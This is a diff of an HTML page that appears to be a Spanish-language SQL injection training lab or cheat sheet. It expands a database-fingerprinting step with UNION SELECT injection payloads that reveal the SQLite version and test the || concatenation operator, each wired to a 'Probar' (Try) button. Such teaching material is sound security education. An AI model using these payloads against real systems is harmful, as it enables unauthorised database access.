@@ -312,13 +312,19 @@
                         </div>
                     </details>
 
-                    <!-- PASO 3: Identificar Motor de BD -->
+                    <!-- PASO 3: Identificar Motor de BD (Fingerprinting) -->
                     <details class="cheat-item">
-                        <summary><strong>Paso 3:</strong> Identificar Motor de BD</summary>
-                        <p class="step-desc">Extraer la versión de SQLite instalada en el servidor.</p>
+                        <summary><strong>Paso 3:</strong> Identificar Motor de BD (Fingerprinting)</summary>
+                        <p class="step-desc">Descubrir si la BD es SQLite, MySQL, Postgres o MSSQL evaluando funciones nativas de versión y concatenación (||).</p>
                         <div class="payload-box">
-                            <code>' UNION SELECT 1, sqlite_version(), 'Motor SQLite', 4, 5, 6 -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, sqlite_version(), 'Motor SQLite', 4, 5, 6 -- ">▶️ Probar</button>
+                            <span class="payload-label">1. Versión de SQLite:</span>
+                            <code>' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- ">▶️ Probar Versión</button>
+                        </div>
+                        <div class="payload-box" style="margin-top:5px;">
+                            <span class="payload-label">2. Operador Concatenación (||):</span>
+                            <code>' UNION SELECT 1, 'SQL' || 'ite', 'Prueba de Concatenación', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'SQL' || 'ite', 'Prueba de Concatenación', 4, 5, 6 -- ">▶️ Probar Concatenación</button>
                         </div>
                     </details>
 
